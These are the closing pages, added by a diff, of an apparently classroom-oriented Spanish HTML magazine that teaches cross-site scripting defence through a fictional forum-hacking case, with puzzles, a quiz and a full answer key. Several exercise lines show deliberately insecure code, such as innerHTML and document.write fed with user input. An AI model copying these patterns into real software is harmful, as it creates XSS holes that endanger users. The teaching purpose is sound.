+  <div class="bottom">
+    <div class="pista"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA E</div><p>Código de ForoClase, línea 42:<br><code style="color:var(--red);font-weight:700">lista.innerHTML += c.texto;</code><br>¿Qué debió escribir Dani en su lugar?</p><span class="note">Anótala en tu expediente.</span></div>
+    <div class="qrbox"><div class="qr" data-qr="#cap5"></div><div><b>Escanea para comparar código en vivo</b><span style="font-size:8.6pt;color:#475569">Versión insegura y segura, lado a lado.</span><br><small data-qr-url="#cap5"></small></div></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 5</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ MENSAJE OCULTO + CIERRE ============ -->
+<section class="page" id="oculto">
+  <div class="chapter-band" style="background:var(--amber)"></div>
+  <div class="kicker" style="color:#B87400">Expediente 01 · Evidencia final</div>
+  <h2 style="font-size:24pt;margin:6px 0 8px">El código oculto</h2>
+  <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
+    <div style="width:56px;height:56px;border-radius:50%;overflow:hidden;border:2px solid var(--navy);background:#E8F1F8;flex:none"><svg class="av"><use href="#dani"/></svg></div>
+    <p style="margin:0;font-size:9.6pt">Dani guardó la clave de la <b>Sala de Evidencias</b> digital escrita como entidades HTML, para que nadie la leyera a simple vista. Usa la tabla para descifrarla: cada <code>&amp;#número;</code> es una letra.</p>
+  </div>
+  <div class="cipher">
+    <div class="cell"><code>&amp;#69;</code><div class="blank"></div></div>
+    <div class="cell"><code>&amp;#83;</code><div class="blank"></div></div>
+    <div class="cell"><code>&amp;#67;</code><div class="blank"></div></div>
+    <div class="cell"><code>&amp;#65;</code><div class="blank"></div></div>
+    <div class="cell"><code>&amp;#80;</code><div class="blank"></div></div>
+    <div class="cell"><code>&amp;#65;</code><div class="blank"></div></div>
+    <div class="cell"><code>&amp;#82;</code><div class="blank"></div></div>
+  </div>
+  <div class="ascii" id="ascii" style="margin-top:10px"></div>
+  <p style="font-size:9pt;color:var(--muted);margin-top:6px">Así es como el navegador «ve» un texto escapado: por eso no lo ejecuta. Con esta clave abrirás la Sala de Evidencias en la web.</p>
+
+  <h3 style="margin-top:10px"><svg class="ic" style="color:#B87400"><use href="#i-folder"/></svg>Cierre del caso</h3>
+  <p style="font-size:9.4pt;margin-bottom:4px">Con tus 5 evidencias, completa el informe final para Dani:</p>
+  <table style="font-size:9.2pt" class="evlog">
+    <tr><td style="width:40%"><b>1.</b> Tipo de XSS usado (Ev. B)</td><td></td></tr>
+    <tr><td><b>2.</b> Qué robó n0cturno (Ev. C)</td><td></td></tr>
+    <tr><td><b>3.</b> Por qué se propagó solo (Ev. D)</td><td></td></tr>
+    <tr><td><b>4.</b> Corrección de la línea 42 (Ev. E)</td><td></td></tr>
+    <tr><td><b>5.</b> Dos defensas extra que recomiendas</td><td></td></tr>
+  </table>
+
+  <div class="bottom single">
+    <div class="qrbox" ><div class="qr" data-qr="#sala"></div><div><b style="color:var(--amber)">Escanea para entrar a la Sala de Evidencias</b><span style="font-size:8.8pt;color:#475569">Escribe la clave descifrada, cierra el caso en la web y consigue la insignia de Detective XSS.</span><br><small data-qr-url="#sala"></small></div></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · El código oculto</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ MISIÓN XSS ============ -->
+<section class="page" id="mision">
+  <div class="chapter-band" style="background:var(--amber)"></div>
+  <div class="kicker" style="color:#B87400">★ Misión XSS</div>
+  <h2 style="font-size:24pt;margin:6px 0 4px">Revisa el resto de ForoClase</h2>
+  <p style="color:var(--muted)">Dani te pide auditar otras partes del foro antes de reabrirlo.</p>
+
+  <h3>Desafío 1 · ¿Vulnerable o seguro?</h3>
+  <p style="font-size:9.6pt">Marca <b>V</b> (vulnerable) o <b>S</b> (seguro) en cada línea.</p>
+  <table style="font-size:9pt">
+    <tr><th>Código</th><th style="width:110px;text-align:center">V / S</th></tr>
+    <tr><td><code>perfil.innerHTML = usuario.nombre;</code></td><td style="text-align:center;white-space:nowrap">☐ V &nbsp; ☐ S</td></tr>
+    <tr><td><code>perfil.textContent = usuario.nombre;</code></td><td style="text-align:center;white-space:nowrap">☐ V &nbsp; ☐ S</td></tr>
+    <tr><td><code>document.write(location.search);</code></td><td style="text-align:center;white-space:nowrap">☐ V &nbsp; ☐ S</td></tr>
+    <tr><td><code>echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8');</code></td><td style="text-align:center;white-space:nowrap">☐ V &nbsp; ☐ S</td></tr>
+  </table>
+
+  <h3>Desafío 2 · Encuentra el tipo</h3>
+  <p style="font-size:9.6pt;margin-bottom:2px">a) Un enlace con código en <code>?q=</code> que solo afecta a quien hace clic: <span style="display:inline-block;width:160px;border-bottom:1px solid #9AA9C0"></span></p>
+  <p style="font-size:9.6pt;margin-bottom:2px">b) Una reseña de producto que ataca a todos los compradores: <span style="display:inline-block;width:160px;border-bottom:1px solid #9AA9C0"></span></p>
+  <p style="font-size:9.6pt">c) <code>div.innerHTML = location.hash</code>: <span style="display:inline-block;width:160px;border-bottom:1px solid #9AA9C0"></span></p>
+
+  <h3>Desafío 3 · Escapa a mano</h3>
+  <p style="font-size:9.6pt">Escribe cómo debe guardarse este texto para que se muestre sin ejecutarse:</p>
+  <pre class="code">&lt;b onclick="x()"&gt;Hola&lt;/b&gt;</pre>
+  <div class="answer-line"></div><div class="answer-line"></div>
+
+  <h3>Desafío 4 · Une cada defensa</h3>
+  <div class="cols" style="font-size:9.6pt">
+    <div><p>① HttpOnly</p><p>② CSP</p><p>③ textContent</p></div>
+    <div><p>○ Bloquea scripts de orígenes no autorizados</p><p>○ Evita que JavaScript lea la cookie</p><p>○ Inserta datos siempre como texto</p></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Misión XSS</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ EVALUACIÓN ============ -->
+<section class="page" id="cap6">
+  <div class="chapter-band"></div>
+  <div class="kicker">Capítulo 6 · Evaluación</div>
+  <h2 style="font-size:24pt;margin:6px 0 4px">Mini cuestionario</h2>
+  <p style="color:var(--muted);font-size:9.6pt">Nombre: ______________________________ &nbsp; Fecha: ____________ &nbsp; Puntaje: ____ / 8</p>
+
+  <div class="cols" style="gap:20px;font-size:9.4pt">
+    <div>
+      <div class="q"><p>1. ¿Qué significa XSS?</p><ol><li>Extra Secure Server</li><li>Cross-Site Scripting</li><li>Cross-System Software</li></ol></div>
+      <div class="q"><p>2. ¿A quién ataca principalmente XSS?</p><ol><li>Al servidor de base de datos</li><li>A los usuarios del sitio</li><li>Al router de la red</li></ol></div>
+      <div class="q"><p>3. ¿Cuál tipo se guarda en la base de datos?</p><ol><li>Reflejado</li><li>Basado en DOM</li><li>Almacenado</li></ol></div>
+      <div class="q"><p>4. ¿Qué propiedad muestra datos como texto plano?</p><ol><li><code>innerHTML</code></li><li><code>textContent</code></li><li><code>outerHTML</code></li></ol></div>
+    </div>
+    <div>
+      <div class="q"><p>5. ¿Qué hace la marca HttpOnly en una cookie?</p><ol><li>La cifra con contraseña</li><li>Impide que JavaScript la lea</li><li>La borra al cerrar sesión</li></ol></div>
+      <div class="q"><p>6. ¿En qué se convierte <code>&lt;</code> al escaparlo?</p><ol><li><code>&amp;lt;</code></li><li><code>%3C</code> siempre</li><li>Se elimina</li></ol></div>
+      <div class="q"><p>7. Bloquear solo la palabra «script» es suficiente.</p><ol><li>Verdadero</li><li>Falso</li></ol></div>
+      <div class="q"><p>8. ¿Qué es CSP?</p><ol><li>Un antivirus</li><li>Una cabecera que limita de dónde se cargan scripts</li><li>Un lenguaje de programación</li></ol></div>
+    </div>
+  </div>
+
+  <h3>Pregunta abierta</h3>
+  <p style="font-size:9.6pt">Explica con tus palabras por qué XSS es peligroso aunque solo muestre un <code>alert()</code>.</p>
+  <div class="answer-line"></div><div class="answer-line"></div><div class="answer-line"></div>
+
+  <div class="bottom single">
+    <div class="qrbox"><div class="qr" data-qr="#mision"></div><div><b>Escanea para la Misión XSS digital</b><span style="font-size:9pt;color:#475569">Desafíos que se corrigen al instante y la Sala de Evidencias.</span><br><small data-qr-url="#mision"></small></div></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Evaluación</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ SOLUCIONARIO ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Respuestas y referencias</div>
+  <h2 style="font-size:22pt;margin:6px 0 12px">Solucionario y glosario</h2>
+  <div class="cols3">
+    <div class="card">
+      <h3 style="margin-top:0">Cuestionario</h3>
+      <p class="mono" style="font-size:9pt;line-height:1.8;margin:0">1·B &nbsp; 2·B &nbsp; 3·C &nbsp; 4·B<br>5·B &nbsp; 6·A &nbsp; 7·B &nbsp; 8·B</p>
+      <p style="font-size:8.6pt;margin:6px 0 0"><b>Abierta:</b> si se ejecuta un <code>alert()</code>, se puede ejecutar cualquier código: robar sesiones, cambiar la página o actuar en nombre del usuario.</p>
+    </div>
+    <div class="card">
+      <h3 style="margin-top:0">Misión XSS</h3>
+      <p style="font-size:8.6pt;margin:0 0 4px"><b>1:</b> V · S · V · S</p>
+      <p style="font-size:8.6pt;margin:0 0 4px"><b>2:</b> a) Reflejado · b) Almacenado · c) DOM</p>
+      <p style="font-size:8.6pt;margin:0 0 4px"><b>3:</b> <code style="font-size:7.6pt">&amp;lt;b onclick=&amp;quot;x()&amp;quot;&amp;gt;Hola&amp;lt;/b&amp;gt;</code></p>
+      <p style="font-size:8.6pt;margin:0"><b>4:</b> ①→cookie · ②→orígenes · ③→texto</p>
+    </div>
+    <div class="card" style="border:2px dashed var(--amber);background:#FFF8EA">
+      <h3 style="margin-top:0">Caso cerrado</h3>
+      <p style="font-size:8.6pt;margin:0 0 3px"><b>Clave:</b> ESCAPAR</p>
+      <p style="font-size:8.6pt;margin:0 0 3px"><b>1.</b> XSS almacenado</p>
+      <p style="font-size:8.6pt;margin:0 0 3px"><b>2.</b> Cookies de sesión</p>
+      <p style="font-size:8.6pt;margin:0 0 3px"><b>3.</b> Actuó como gusano (como Samy)</p>
+      <p style="font-size:8.6pt;margin:0 0 3px"><b>4.</b> <code>textContent</code> o escapar</p>
+      <p style="font-size:8.6pt;margin:0"><b>5.</b> HttpOnly, CSP, validación…</p>
+    </div>
+  </div>
+
+  <h3 style="margin-top:14px">Glosario</h3>
+  <table style="font-size:9pt">
+    <tr><td style="width:24%"><b>Carga útil (payload)</b></td><td>El fragmento de código malicioso que el atacante inyecta.</td></tr>
+    <tr><td><b>Cookie de sesión</b></td><td>Dato que el sitio guarda en el navegador para recordar que iniciaste sesión.</td></tr>
+    <tr><td><b>CSP</b></td><td>Content Security Policy: reglas que limitan qué scripts puede ejecutar una página.</td></tr>
+    <tr><td><b>DOM</b></td><td>Representación de la página que el navegador construye y que JavaScript puede modificar.</td></tr>
+    <tr><td><b>Entidad HTML</b></td><td>Forma segura de escribir un carácter: <code>&amp;lt;</code> para <code>&lt;</code>, <code>&amp;#65;</code> para A.</td></tr>
+    <tr><td><b>Escapar</b></td><td>Convertir caracteres especiales en entidades para que se muestren como texto.</td></tr>
+    <tr><td><b>Sanitizar</b></td><td>Limpiar HTML eliminando lo peligroso y conservando lo permitido.</td></tr>
+  </table>
+
+  <h3 style="margin-top:12px">Para seguir aprendiendo</h3>
+  <ul class="tight" style="font-size:9.2pt">
+    <li>OWASP — <i>Cross Site Scripting Prevention Cheat Sheet</i> (cheatsheetseries.owasp.org)</li>
+    <li>OWASP Top 10:2021 — A03 Inyección (owasp.org/Top10)</li>
+    <li>MDN Web Docs — <i>Cross-site scripting (XSS)</i> y <i>Content Security Policy</i></li>
+    <li>PortSwigger Web Security Academy — laboratorios gratuitos y legales de XSS</li>
+  </ul>
+  <p style="font-size:8.4pt;color:var(--muted)">ForoClase, Ana, Dani y n0cturno son personajes ficticios creados para esta revista.</p>
+  <div class="folio"><span>XSS ACADEMY · Referencias</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CONTRAPORTADA ============ -->
+<section class="page opener" style="padding:0 0 35px 0;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center">
+  <div style="margin-bottom:28px">
+    <div class="stamp" style="position:static;display:inline-block;font-size:18pt;border-color:var(--green);color:var(--green);transform:rotate(-7deg);background:#fff">CASO CERRADO</div>
+  </div>
+  <div class="kicker" style="color:var(--turq2)">Recuerda</div>
+  <h1 style="font-size:38pt;color:var(--navy);margin-top:18px;line-height:1.25">Los datos del usuario<br>son <span style="color:var(--turq2)">texto</span>,<br>nunca código.</h1>
+  <svg width="360" height="120" viewBox="0 0 330 110" style="margin-top:36px;display:block">
+    <use href="#ana" x="0" y="0" width="110" height="110"/><use href="#dani" x="110" y="0" width="110" height="110"/><use href="#servidor" x="220" y="0" width="110" height="110"/>
+  </svg>
+  <div class="folio" style="justify-content:center"><span>XSS ACADEMY · El código oculto · Edición 01</span></div>
+</section>
+
+<script>
+  // Cómic compartido con la web
+  document.getElementById('comic').innerHTML = XSSA.comic().join('');
+  // Tabla de entidades A–Z
+  document.getElementById('ascii').innerHTML = Array.from({length:26}, (_, i) =>
+    `<div><b>${String.fromCharCode(65 + i)}</b><span>${65 + i}</span></div>`).join('');
+  // Numeración automática de páginas e índice
+  const pages = [...document.querySelectorAll('.page')];
+  pages.forEach((p, i) => p.querySelectorAll('.pg').forEach(el => el.textContent = String(i + 1).padStart(2, '0')));
+  const pageOf = id => pages.indexOf(document.getElementById(id)) + 1;
+  document.querySelectorAll('[data-ref]').forEach(el => el.textContent = 'pág. ' + pageOf(el.dataset.ref));
+  document.querySelectorAll('[data-pg]').forEach(el => el.textContent = pageOf(el.dataset.pg));
+  // Códigos QR
+  document.querySelectorAll('[data-qr]').forEach(el => {
+    const url = WEB_URL + el.getAttribute('data-qr');
+    if (window.QRCode) new QRCode(el, { text:url, width:168, height:168, colorDark:"#0B1B33", colorLight:"#ffffff", correctLevel:QRCode.CorrectLevel.M });
+  });
+  document.querySelectorAll('[data-qr-url]').forEach(el => { el.textContent = (WEB_URL + el.getAttribute('data-qr-url')).replace(/^https?:\/\//, ''); });
+</script>
+</body>
+</html>
